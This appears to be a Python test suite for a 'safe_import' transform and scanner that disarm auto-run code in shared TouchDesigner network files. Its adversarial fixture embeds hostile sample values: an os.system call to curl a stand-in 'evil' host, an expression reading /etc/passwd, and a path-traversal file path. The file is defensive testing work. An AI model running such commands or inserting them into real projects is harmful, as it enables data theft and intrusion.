"""
Test suite: Community-safety SAFE-IMPORT transform + CollectionExt glue.

Runs inside the main Embody suite against the LIVE Collection modules:
    si  = op.Embody.op('Collection/safe_import').module   (make_inert, is_inert)
    coll = op.Embody.op('Collection').ext.Collection       (ScanTdn, PlanCommunityPaste)

safe_import is the default-inert TDN import transform. It is PRESENCE-agnostic
and ARMED-STATE-based: it disarms every auto-run surface (execute DATs, expr/bind
parameters, COMP extensions, IO ops, storage) while preserving structure and
inert content. The standalone unit tests live beside the module at
Embody/Collection/tests/test_safe_import.py and
test_safe_import_scanner_integration.py; this file exercises the same contracts
through the live, in-TD module + the CollectionExt glue.

EmbodyTestCase, SkipTest, the td module, op/project/etc. are all injected by the
runner -- do NOT import them. ASCII only.
"""

import copy


# ---------------------------------------------------------------------------
# Adversarial / fixture TDN builders (kept local + deterministic)
# ---------------------------------------------------------------------------

def _base_tdn(operators=None, **extra):
    tdn = {
        "format": "tdn",
        "version": "1.4",
        "generator": "test",
        "network_path": "/project",
        "type": "baseCOMP",
        "options": {"include_dat_content": True, "include_storage": True},
        "operators": operators or [],
    }
    tdn.update(extra)
    return tdn


def _adversarial_tdn():
    """A TDN that lights up every armed surface safe_import disarms."""
    return {
        "format": "tdn",
        "version": "1.4",
        "network_path": "/test",
        "type": "baseCOMP",
        "operators": [
            {
                "name": "execute1",
                "type": "executeDAT",
                "dat_content": "import os\nos.system('curl http://evil')\n",
                "dat_content_format": "text",
                "parameters": {"active": "=op('ctrl').par.On"},
            },
            {
                "name": "glow1",
                "type": "levelTOP",
                "parameters": {"gamma": "=open('/etc/passwd').read()"},
            },
            {
                "name": "rig1",
                "type": "baseCOMP",
                "sequences": {"ext": [{"object": "RigExt", "name": "Rig"}]},
                "storage": {"secret": "payload"},
            },
            {"name": "net1", "type": "webclientDAT"},
            {
                "name": "mov1",
                "type": "moviefileinTOP",
                "parameters": {"file": "../../../etc/passwd"},
            },
        ],
    }


def _collect_structure(tdn):
    """Return (paths, connections) so structure preservation can be asserted."""
    paths = set()
    connections = {}

    def walk(op_def, parent):
        if not isinstance(op_def, dict):
            return
        path = parent.rstrip("/") + "/" + op_def["name"]
        paths.add(path)
        connections[path] = (
            copy.deepcopy(op_def.get("inputs")),
            copy.deepcopy(op_def.get("comp_inputs")),
        )
        for child in op_def.get("children", []):
            walk(child, path)

    for op_def in tdn.get("operators", []):
        walk(op_def, tdn.get("network_path", "/"))
    return paths, connections


class TestCollectionSafeImport(EmbodyTestCase):

    # The summary keys make_inert always reports (from safe_import.SUMMARY_KEYS).
    SUMMARY_KEYS = (
        "execute_dats_disabled",
        "exprs_neutralized",
        "extensions_disabled",
        "io_ops_bypassed",
        "storage_removed",
    )

    def setUp(self):
        super().setUp()
        collection = self.embody.op('Collection')
        if collection is None:
            raise SkipTest('Collection component not present')

        si_dat = collection.op('safe_import')
        if si_dat is None:
            raise SkipTest('Collection/safe_import not present')
        self.si = si_dat.module

        scanner_dat = collection.op('scanner')
        if scanner_dat is None:
            raise SkipTest('Collection/scanner not present')
        self.scanner = scanner_dat.module

        try:
            self.coll = collection.ext.Collection
        except Exception:
            raise SkipTest('CollectionExt not initialized')

    # -----------------------------------------------------------------------
    # Helpers
    # -----------------------------------------------------------------------

    def _assert_summary_counts(self, summary, **expected):
        defaults = {key: 0 for key in self.SUMMARY_KEYS}
        defaults.update(expected)
        for key, value in defaults.items():
            self.assertEqual(
                summary[key], value,
                'summary[%r] expected %r got %r' % (key, value, summary.get(key)))

    # =======================================================================
    # make_inert -- execute DATs
    # =======================================================================

    def test_execute_dat_deactivated_content_kept(self):
        """active -> False, but dat_content is preserved verbatim."""
        tdn = _base_tdn([
            {
                "name": "exec1",
                "type": "executeDAT",
                "parameters": {"active": True},
                "dat_content": "def onStart():\n    print('run')",
                "dat_content_format": "text",
            }
        ])
        inert, summary = self.si.make_inert(tdn)
        exec_op = inert["operators"][0]
        self.assertEqual(exec_op["parameters"]["active"], False)
        self.assertEqual(exec_op["dat_content"], tdn["operators"][0]["dat_content"])
        self._assert_summary_counts(summary, execute_dats_disabled=1)
        self.assertTrue(self.si.is_inert(inert))

    # =======================================================================
    # make_inert -- expression / bind neutralization
    # =======================================================================

    def test_expr_and_bind_become_safe_constants(self):
        """=expr and ~bind values collapse to type/style-appropriate constants;
        literal ==/~~ values are left intact; custom_pars are covered too."""
        tdn = _base_tdn([
            {
                "name": "exprs",
                "type": "constantCHOP",
                "parameters": {
                    "value0": "=absTime.frame",
                    "name0": "~op('source').par.name",
                    "literal_eq": "==literal",
                    "literal_bind": "~~literal",
                },
                "custom_pars": {
                    "Controls": [
                        {"name": "Speed", "style": "Float", "value": "=absTime.seconds"},
                        {"name": "Label", "style": "Str", "value": "~op('label')"},
                        {"name": "Enabled", "style": "Toggle", "value": "=1"},
                        {"name": "Pair", "style": "XY", "values": ["=1", 2]},
                    ],
                    "About": {
                        "$t": "about",
                        "Build": "=42",
                        "Name": "~op('name')",
                    },
                },
                "sequences": {
                    "const": [
                        {"value": "=me.time.frame", "name": "~parent().name"},
                    ]
                },
            }
        ])
        inert, summary = self.si.make_inert(tdn)
        op_def = inert["operators"][0]

        self.assertEqual(op_def["parameters"]["value0"], 0)
        self.assertEqual(op_def["parameters"]["name0"], "")
        # literal == / ~~ pass through untouched.
        self.assertEqual(op_def["parameters"]["literal_eq"], "==literal")
        self.assertEqual(op_def["parameters"]["literal_bind"], "~~literal")
        self.assertEqual(op_def["custom_pars"]["Controls"][0]["value"], 0)
        self.assertEqual(op_def["custom_pars"]["Controls"][1]["value"], "")
        self.assertEqual(op_def["custom_pars"]["Controls"][2]["value"], False)
        self.assertEqual(op_def["custom_pars"]["Controls"][3]["values"], [0, 2])
        self.assertEqual(op_def["custom_pars"]["About"]["Build"], 0)
        self.assertEqual(op_def["custom_pars"]["About"]["Name"], "")
        self.assertEqual(op_def["sequences"]["const"][0]["value"], 0)
        self.assertEqual(op_def["sequences"]["const"][0]["name"], "")

        originals = [d.get("original") for d in summary["details"]]
        self.assertIn("=absTime.frame", originals)
        self.assertIn("~op('source').par.name", originals)
        self._assert_summary_counts(summary, exprs_neutralized=10)
        self.assertTrue(self.si.is_inert(inert))

    def test_literal_eq_and_tilde_not_neutralized(self):
        """== and ~~ prefixes are literal escapes, not expr/bind -- left alone."""
        tdn = _base_tdn([
            {
                "name": "lit",
                "type": "textDAT",
                "parameters": {"a": "==stays", "b": "~~stays"},
            }
        ])
        inert, summary = self.si.make_inert(tdn)
        op_def = inert["operators"][0]
        self.assertEqual(op_def["parameters"]["a"], "==stays")
        self.assertEqual(op_def["parameters"]["b"], "~~stays")
        self._assert_summary_counts(summary)

    # =======================================================================
    # make_inert -- COMP extensions
    # =======================================================================

    def test_comp_extensions_disabled_children_kept(self):
        """Enabled ext blocks become empty {}; the child DAT survives."""
        tdn = _base_tdn([
            {
                "name": "owner",
                "type": "baseCOMP",
                "sequences": {
                    "ext": [
                        {
                            "object": "op('./OwnerExt').module.OwnerExt(me)",
                            "name": "OwnerExt",
                            "promote": True,
                        },
                        {},
                    ]
                },
                "children": [
                    {
                        "name": "OwnerExt",
                        "type": "textDAT",
                        "dat_content": "class OwnerExt:\n    pass",
                        "dat_content_format": "text",
                    }
                ],
            }
        ])
        inert, summary = self.si.make_inert(tdn)
        owner = inert["operators"][0]
        self.assertEqual(owner["sequences"]["ext"], [{}, {}])
        self.assertEqual(owner["children"][0]["name"], "OwnerExt")
        self.assertEqual(owner["children"][0]["dat_content"], "class OwnerExt:\n    pass")
        self._assert_summary_counts(summary, extensions_disabled=1)
        self.assertTrue(self.si.is_inert(inert))

    # =======================================================================
    # make_inert -- IO operators
    # =======================================================================

    def test_io_operator_bypassed_other_flags_kept(self):
        """An IO op gains 'bypass' while its existing 'viewer' flag is preserved."""
        tdn = _base_tdn([
            {
                "name": "client1",
                "type": "webclientDAT",
                "flags": ["viewer"],
                "parameters": {"url": "https://example.test"},
            }
        ])
        inert, summary = self.si.make_inert(tdn)
        flags = inert["operators"][0]["flags"]
        self.assertIn("viewer", flags)
        self.assertIn("bypass", flags)
        self._assert_summary_counts(summary, io_ops_bypassed=1)
        self.assertTrue(self.si.is_inert(inert))

    # =======================================================================
    # make_inert -- storage stripping
    # =======================================================================

    def test_storage_startup_and_root_storage_stripped(self):
        """storage + startup_storage on a node AND root storage are all removed."""
        tdn = _base_tdn(
            [
                {
                    "name": "stored",
                    "type": "baseCOMP",
                    "storage": {"payload": {"$type": "bytes", "$value": "AAEC"}},
                    "startup_storage": {"mode": "auto"},
                }
            ],
            storage={"root_payload": 1},
        )
        inert, summary = self.si.make_inert(tdn)
        self.assertNotIn("storage", inert)
        self.assertNotIn("storage", inert["operators"][0])
        self.assertNotIn("startup_storage", inert["operators"][0])
        originals = [d.get("original") for d in summary["details"]]
        self.assertIn({"storage": {"root_payload": 1}}, originals)
        self.assertIn({"startup_storage": {"mode": "auto"}}, originals)
        self._assert_summary_counts(summary, storage_removed=3)
        self.assertTrue(self.si.is_inert(inert))

    # =======================================================================
    # make_inert -- input immutability, idempotency, structure
    # =======================================================================

    def test_input_not_mutated_idempotent_structure_preserved(self):
        """make_inert deep-copies (input untouched), is idempotent on a second
        pass, and preserves the operator tree + connections."""
        tdn = _base_tdn([
            {
                "name": "container1",
                "type": "baseCOMP",
                "parameters": {"w": "=absTime.frame"},
                "children": [
                    {
                        "name": "exec1",
                        "type": "executeDAT",
                        "inputs": ["source1"],
                        "comp_inputs": ["panel1"],
                        "dat_content": "def onFrameStart(frame):\n    return",
                        "dat_content_format": "text",
                    },
                    {
                        "name": "client1",
                        "type": "webclientDAT",
                        "inputs": ["exec1"],
                    },
                ],
            }
        ])
        original = copy.deepcopy(tdn)
        before_structure = _collect_structure(tdn)

        inert, summary = self.si.make_inert(tdn)
        inert_again, second_summary = self.si.make_inert(inert)

        # Input untouched.
        self.assertEqual(tdn, original)
        self.assertIsNot(inert, tdn)
        # Idempotent: second pass is a no-op.
        self.assertEqual(inert_again, inert)
        self._assert_summary_counts(second_summary)
        # Structure + connections preserved.
        self.assertEqual(_collect_structure(inert), before_structure)
        self._assert_summary_counts(
            summary,
            execute_dats_disabled=1,
            exprs_neutralized=1,
            io_ops_bypassed=1,
        )
        self.assertTrue(self.si.is_inert(inert))

    # =======================================================================
    # make_inert -- type_defaults / par_templates / root surfaces
    # =======================================================================

    def test_type_defaults_par_templates_and_root_neutralized(self):
        tdn = _base_tdn(
            [
                {
                    "name": "movie1",
                    "type": "moviefileinTOP",
                }
            ],
            parameters={"resizecomp": "=me"},
            type_defaults={
                "moviefileinTOP": {
                    "parameters": {"file": "~op('path')"},
                    "flags": ["viewer"],
                }
            },
            par_templates={
                "dynamic": [
                    {
                        "name": "Choice",
                        "style": "Menu",
                        "menuSource": "=op('menu')",
                    }
                ]
            },
        )
        inert, summary = self.si.make_inert(tdn)
        self.assertEqual(inert["parameters"]["resizecomp"], "")
        self.assertEqual(inert["type_defaults"]["moviefileinTOP"]["parameters"]["file"], "")
        self.assertEqual(inert["par_templates"]["dynamic"][0]["menuSource"], "")
        self.assertIn("bypass", inert["operators"][0]["flags"])
        self._assert_summary_counts(summary, exprs_neutralized=3, io_ops_bypassed=1)
        self.assertTrue(self.si.is_inert(inert))

    # =======================================================================
    # make_inert -- malformed input must not raise
    # =======================================================================

    def test_malformed_tdn_does_not_raise(self):
        """None ops, str flags, and a non-dict 'parameters' value are tolerated."""
        malformed = {
            "network_path": "/bad",
            "parameters": "bad",
            "operators": [
                None,
                {"name": "client", "type": "webclientDAT", "flags": "bad"},
            ],
        }
        inert, summary = self.si.make_inert(malformed)
        self.assertIn("bypass", inert["operators"][1]["flags"])
        self._assert_summary_counts(summary, io_ops_bypassed=1)

    # =======================================================================
    # is_inert
    # =======================================================================

    def test_is_inert_true_after_inert_false_on_armed(self):
        armed = _adversarial_tdn()
        self.assertFalse(self.si.is_inert(armed))
        inert, _ = self.si.make_inert(armed)
        self.assertTrue(self.si.is_inert(inert))

    def test_is_inert_false_on_none_and_returns_bool_on_malformed(self):
        self.assertFalse(self.si.is_inert(None))
        result = self.si.is_inert({
            "network_path": "/bad",
            "parameters": "bad",
            "operators": [None, {"name": "c", "type": "webclientDAT", "flags": "bad"}],
        })
        self.assertIsInstance(result, bool)

    # =======================================================================
    # Integration: scanner + safe_import agree on armed vs presence surfaces
    # =======================================================================

    def test_scanner_detects_every_armed_surface(self):
        counts = self.scanner.scan_tdn(_adversarial_tdn())["counts"]
        self.assertGreaterEqual(counts["execute_dats"], 1)
        self.assertGreaterEqual(counts["file_read_exprs"], 1)
        self.assertGreaterEqual(counts["extensions"], 1)
        self.assertGreaterEqual(counts["storage_payloads"], 1)
        self.assertGreaterEqual(counts["web_ops"], 1)
        self.assertGreaterEqual(counts["traversal_paths"], 1)

    def test_rescan_after_inert_drops_armed_surfaces(self):
        """The surfaces safe_import REMOVES/neutralizes drop to 0 on a re-scan;
        presence-only surfaces (web_ops type, traversal path) may legitimately
        remain since the bypassed op is still in the inventory."""
        inert, _ = self.si.make_inert(_adversarial_tdn())
        counts = self.scanner.scan_tdn(inert)["counts"]
        self.assertEqual(counts["file_read_exprs"], 0)
        self.assertEqual(counts["extensions"], 0)
        self.assertEqual(counts["storage_payloads"], 0)

    def test_make_inert_does_not_change_original_scan(self):
        """make_inert mutates nothing, so the ORIGINAL re-scans identically."""
        original = _adversarial_tdn()
        before = self.scanner.scan_tdn(original)["counts"]
        self.si.make_inert(original)
        after = self.scanner.scan_tdn(original)["counts"]
        self.assertEqual(before, after)

    # =======================================================================
    # CollectionExt glue
    # =======================================================================

    def test_plan_community_paste_returns_inert_plan(self):
        """PlanCommunityPaste returns mode=='inert', a capability report, a
        summary, and a plan['tdn'] that passes is_inert."""
        plan = self.coll.PlanCommunityPaste(_adversarial_tdn())
        self.assertEqual(plan["mode"], "inert")
        self.assertDictHasKey(plan, "capability")
        self.assertDictHasKey(plan, "summary")
        self.assertDictHasKey(plan, "tdn")
        # capability is the scanner's CapabilityJson (verdict + counts).
        self.assertDictHasKey(plan["capability"], "verdict")
        self.assertDictHasKey(plan["capability"], "counts")
        # summary is make_inert's report.
        for key in self.SUMMARY_KEYS:
            self.assertDictHasKey(plan["summary"], key)
        # The planned payload is genuinely inert.
        self.assertTrue(self.si.is_inert(plan["tdn"]))

    def test_plan_community_paste_capability_is_flagged_for_adversarial(self):
        """An armed adversarial TDN scans to a non-clean verdict in the plan."""
        plan = self.coll.PlanCommunityPaste(_adversarial_tdn())
        self.assertIn(plan["capability"]["verdict"], ("flagged", "blocked"))

    def test_scan_tdn_empty_is_clean(self):
        """ScanTdn({}) -- no surfaces present -> 'clean' verdict."""
        report = self.coll.ScanTdn({})
        self.assertEqual(report["verdict"], "clean")
        self.assertDictHasKey(report, "counts")

    def test_scan_tdn_non_dict_coerced(self):
        """ScanTdn defends against a non-dict argument (coerced to {})."""
        report = self.coll.ScanTdn(None)
        self.assertEqual(report["verdict"], "clean")
